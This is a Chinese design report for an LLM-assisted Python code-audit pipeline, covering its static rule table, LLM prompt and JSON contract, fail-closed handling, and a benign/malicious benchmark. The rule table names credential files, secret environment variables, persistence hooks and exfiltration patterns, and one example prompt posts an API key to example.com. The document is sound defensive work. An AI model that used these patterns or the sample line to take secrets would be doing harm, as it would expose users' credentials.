TAA 代码审计设计报告

离线本地推理 LLM 失败必须显式 默认 fail-closed 可回放 可评测
目标

让审计结果可解释、可追踪、可复现，并且在 LLM 不可用或不确定时不默认放行。

范围

聚焦现有 TAA 审计流水线、训练报告投影和 benchmark 设计，不另起新系统，只补齐治理层与评测层。

依据

1. 设计框架

本节描述 TAA 代码审计的分层框架，以及各层之间的输入、输出和职责分配。图中实线表示现有框架，下方虚线带表示最终完整框架中待补的检索增强与结构化表示增强。

2. 静态规则与扫描窗口

静态扫描不是模糊的“找可疑代码”，而是一个可枚举的规则表。当前 analyzer 只扫描 Python 文件，跳过注释行、隐藏目录和 `__pycache__`，每条命中都会带出固定大小的上下文窗口。

扫描范围

扫描什么，不扫描什么

  • 只遍历以 `.py` 结尾的文件。
  • 递归进入普通子目录，但跳过以 `.` 开头的目录和 `__pycache__`。
  • 如果一行以 `#` 或 `//` 开头，直接跳过，不做规则匹配。
  • 规则命中后只取当前行对应的上下文，不回头做跨文件图搜索。
上下文窗口

邻近行到底是多少行

  • 当前实现固定取触发行前 3 行 和后 3 行。
  • 窗口公式等价于：start = max(0, i-3)，end = min(len(lines), i+4)。
  • 返回给 LLM 的 context_before 不含当前行，context_after 也不含当前行。
  • 也就是说，LLM 看到的是“前 3 行 + 触发行 + 后 3 行”，共最多 7 行。
规则 ID 类别 / 严重级别 触发模式 设计意图 容易误报的 benign 形态
NET_001 网络请求 / HIGH requests.get/post/put/delete/patch、urllib.request.urlopen/urlretrieve、http.client、httpx.*、aiohttp.ClientSession、httplib2.Http 找出显式 HTTP/HTTPS 传输点，用于识别外传或远端控制。 仅发送指标、下载公开模型或拉取公开配置。
NET_002 底层网络 / HIGH socket.socket、socket.create_connection、.connect(...)、.sendall() 识别绕过 HTTP 监控的原始 socket 外联。 本地 IPC、测试桩、日志服务的内网连接。
CMD_001 命令执行 / HIGH subprocess.run/call/Popen/check_output、os.system、os.popen、os.exec*、commands.getoutput 识别 shell 执行、管道拼接、外部命令拉取/发送数据。 本地测试脚本、离线构建、受控工具调用。
OBF_001 代码混淆 / HIGH base64.b64decode/b64encode、pickle.loads/dumps、marshal.loads/dumps、zlib.decompress、codecs.decode、binascii.a2b/b2a 识别隐藏载荷、序列化绕过和压缩后外传。 报告导出、数据打包、正常压缩。
DYN_001 动态执行 / MEDIUM eval、exec、compile(..., 'exec')、__import__、importlib.import_module 识别运行时加载/拼接代码的危险点。 框架插件加载、模块懒加载、测试替身。
FIL_001 敏感文件读取 / MEDIUM 对 .ssh、.env、password、credential、.aws、.kube、id_rsa、authorized_keys 的 open/Path/read_text/read_bytes 识别显式读取密钥、凭证和私有配置文件。 读取公开配置、训练集路径、模型元信息。
ENV_001 环境变量 / MEDIUM os.environ[...]、os.environ.get(...)、os.getenv(...)，且 key 名含 secret/token/api_key/access_key/private_key/password/passwd/cred/auth/session/cookie/kube/aws/gcp/azure/github/gitlab 识别敏感环境变量提取。 普通运行参数、模型名称、数据根目录。
PER_001 持久化后门 / HIGH crontab、cron.tab、.bashrc、.bash_profile、.zshrc、.profile、systemctl enable/start、/etc/init.d、/etc/systemd 识别把代码持久化到系统启动链路的行为。 用户级 shell 初始化、演示脚本、临时测试命令。
EXF_001 数据外传 / HIGH base64.*request、request.*base64、json.dumps.*post、post.*json.dumps、encode.*send、send.*encode、upload.*file、file.*upload 识别“先编码后发送”的典型外传形态。 正常报表上报、模型指标上传、文件同步。
设计判断：静态扫描的职责不是“判断有没有恶意”，而是“把值得判断的代码段精确送进 LLM”。所以规则必须宽，但证据必须窄；命中可以多，但上下文一定要短、准、可解释。

3. LLM 输入与返回契约

命中规则后，送给 LLM 的不是整文件，而是一个明确的 finding prompt 或 file prompt。二者用途不同：前者用于单点语义确认，后者用于文件级攻击链判断。

Finding 级

传给 LLM 的字段

  • file：完整路径。
  • line：触发规则的行号。
  • rule_id、category、description：规则语义。
  • context_before：触发行前 3 行。
  • code_snippet：触发行本身。
  • context_after：触发行后 3 行。
你是一个代码安全审计专家。请分析以下代码片段是否存在窃取数据、外传数据或其他恶意行为。 ## 代码片段 文件: /path/to/sample.py (第 42 行) ```python import os import requests api_key = os.getenv("API_KEY") >>> requests.post("https://example.com/upload", json={"key": api_key}) print("done") ``` ## 触发的规则 规则ID: NET_001 类别: 网络请求 严重度: HIGH 规则说明: 检测显式 HTTP/HTTPS 传输点，用于识别外传或远端控制。 ## 请回答 1. verdict: MALICIOUS(恶意) / SUSPICIOUS(可疑) / BENIGN(正常) / UNCERTAIN(不确定) 2. reason: 一句话说明理由（中文） 3. risk: 如果恶意，数据会怎样被利用 请严格按以下 JSON 格式回答，不要包含其他内容: {"verdict":"...","reason":"...","risk":"..."}
File 级

传给 LLM 的字段

  • file：文件 basename，不再需要完整路径。
  • line_count：文件总行数。
  • findings_count：静态命中数。
  • findings_summary：去重后的规则摘要，格式如 CMD_001(命令执行,HIGH)。
  • full_code：最多前 80 行源码；超过后追加截断说明。
文件: sample.py (123 行) 发现 4 个可疑点: CMD_001(命令执行,HIGH), EXF_001(数据外传,HIGH) ```python 前 80 行代码 # ... (截断，文件超过 80 行) ``` 严格按 JSON 回答: {"risk_level":"HIGH|MEDIUM|LOW|UNCERTAIN","summary":"一句话安全结论","chained":true,"exfiltration":true}

输出规则

返回什么，失败时怎么办

  • Finding 级必须返回 verdict / reason / risk。
  • File 级必须返回 risk_level / summary / chained / exfiltration。
  • 后端缺失时，直接返回 UNCERTAIN，理由写“未配置推理后端”。
  • 模型返回无法解析时，继续返回 UNCERTAIN，理由保留原始错误。

解析策略

只接 JSON，不接散文

  • 调用侧把温度固定到 0.1，减少漂移。
  • 返回文本只做一次 JSON 提取，不做多轮猜测。
  • 提取失败即转 UNCERTAIN，不允许“猜一个像样的标签”。
  • 这就是 fail-closed 的具体实现：失败状态必须进入结果，而不是消失。

4. 数据对象与报告契约

设计上最重要的不是某个函数名，而是中间对象是否足够清楚。只要对象稳定，阶段之间就能解耦，报告就能回放，评测也能对齐。当前已经落地的训练报告投影，证明了这个方向是对的：`codeaudit` 只保留 `conclusion` 和 `file_reports`，外层训练失败不再篡改结论。

对象 职责 主要字段 设计理由
Finding 静态规则命中的候选点 file、line、rule_id、category、severity、code_snippet、context_before、context_after 这是进入 LLM 之前最小粒度的证据单元，必须可定位、可复核。
FileSummary 文件级语义结论 risk_level、summary、chained、exfiltration 用于判断跨文件或多点命中是否构成攻击链。
AuditConclusion 最终策略结论 passed、risk_level、summary、recommendation 把“模型说了什么”和“系统最终做什么”分开。
AuditStatistics 结果计数 total_findings、high、medium、malicious、suspicious、benign、uncertain 为评测、报表和回归定位提供统一计数口径。
RunMetadata 回放与版本治理 run_id、benchmark_version、auditor_version、rule_set_version、prompt_version、llm_state 没有这些字段，就无法解释为什么同样样本会在不同轮次得出不同结论。

训练报告投影契约

只保留子结构，不泄漏外层审计对象

  • `codeaudit` 只包含 `conclusion` 与 `file_reports`。
  • 外层 `report_id`、`target`、`statistics`、`scan_metadata` 不应进入训练输出。
  • `conclusion` 必须保持原审计结果，不被训练失败路径改写。

为什么这样拆

边界清晰，回放一致

  • 训练报告要的是审计结论投影，不是完整审计对象。
  • 平台上报与本地文件应该共享同一投影逻辑。
  • 这样才能避免“双轨 JSON 不一致”。

5. Benchmark 设计

benchmark 的目标不是单纯压分，而是验证审计链路是否能稳稳地区分“看起来像危险”与“真的有危险”。因此样本设计必须做 source isolation，必须覆盖 benign trap 和恶意链路，必须把生成、评测和结果回放写成一条闭环。

这里的“10 家族”指样本变体类别，不是模型类别。 每个家族都代表一类会触发不同审计规则的代码改写；良性家族用来测误报，恶意家族用来测漏报。每个家族再各生成 10 个样本，所以总数是 100。

样本总览

100 样本 / 10 家族 / 50 良性 / 50 恶意

  • 基座项目：`LogisticRegression`、`TEE-test`、`Retina-DKD`。
  • 良性样本来自前两个项目，恶性样本来自 `Retina-DKD`，实现 source isolation。
  • 每个家族 10 个样本，便于横向比较与回归追踪。

生成策略

复制基座 → 写变体 → 写支持文件 → 生成 sample.json

  • 不直接修改源项目，保证可重复。
  • 良性家族只做重构、日志、配置包装、报告导出、入口改写。
  • 恶性家族引入命令执行、网络外传、秘密读取、混淆编码和攻击链。

10 个家族

B1-B5 / M1-M5

家族 类型 在测什么
B1良性纯重构，不改变行为，测“代码变了但语义没变”是否会被误报。
B2良性安全日志与调试输出，测正常日志是否会被当成泄密。
B3良性配置与数据读取包装，测普通读取/封装是否会被当成窃密。
B4良性报告生成与导出，测序列化、落盘、导出是否会触发误报。
B5良性入口与 wrapper 改写，测适配层重组是否会被误判为执行链。
M1恶意命令执行，测 shell / subprocess / exec 类风险是否被抓到。
M2恶意网络外传，测 HTTP 或 socket 外联是否被抓到。
M3恶意敏感数据读取，测凭证、密钥、私有配置是否被抓到。
M4恶意混淆与编码，测 base64 / pickle / marshal / zlib 等隐藏载荷是否被抓到。
M5恶意攻击链与持久化，测多步组合、持久化写入和自启动改写是否被抓到。

  • LLM 不可用时不能静默降低严格度。
  • 输出结果必须保留 `llm_available_rate` 与 `fail_closed_count`。

7. 设计依据

下面这些文档与实际 benchmark 输出共同构成当前设计的依据。它们说明系统已经具备什么、在哪些地方暴露出问题、以及为什么要采用现在这套补强方式。

`qwen-audit-implementation-design.md`

确认当前实现已经是三层聚合：静态扫描负责召回，LLM 负责语义判断，聚合逻辑负责输出最终结论。它支持本设计保留五段式闭环，而不是重做架构。

`audit-rules-design.md`

说明静态层本质是规则召回，并且已经在处理框架误报。这支持本设计把 stage 1 定位为“候选筛选器”，而不是最终裁决器。

`audit-prompt-matrix.md`

指出 prompt 仍存在 JSON 解析脆弱、判定步骤不够明确、`UNCERTAIN` 规则不足、benign trap 需要显式豁免等问题。这直接支持本设计把 prompt 约束和人工复核边界写进架构。

`audit-evaluation-results-template.md`

要求结果记录 `rule_set_version`、`prompt_version`、`auditor_version`、`llm_state`、`fail_closed_count` 等字段，也要求分层统计与错误类型分类。这支持本设计把版本和失效状态作为一等字段，而不是附注。

`audit-eval-iteration-log.md`

记录了 `llm_unavailable`、`parse_error`、静态基线、来源混杂、版本漂移等真实问题。它说明设计必须面向“失败可见”和“回放可追踪”，不能把系统当成一条永远成功的理想链路。

`audit-research.md`

强调审计器和被审计对象要分离，且高可靠审计应记录 `auditor_model`、`rule_set_version`、`prompt_version`、`llm_state` 和 `fail_closed`。这构成了本设计的总原则：可解释性、可复现性和保守失败优先。

8. 下一步

如果后续继续往实现文档推进，优先顺序已经很清楚：先把证据包 schema 写清楚，再把训练报告与平台上报字段对齐，最后把 benchmark 的家族扩展成持续回归集。

下一步最值得补的内容

  • 证据包 schema 样例。
  • JSON 输出字段约定。
  • 错误类型到处理动作的映射表。
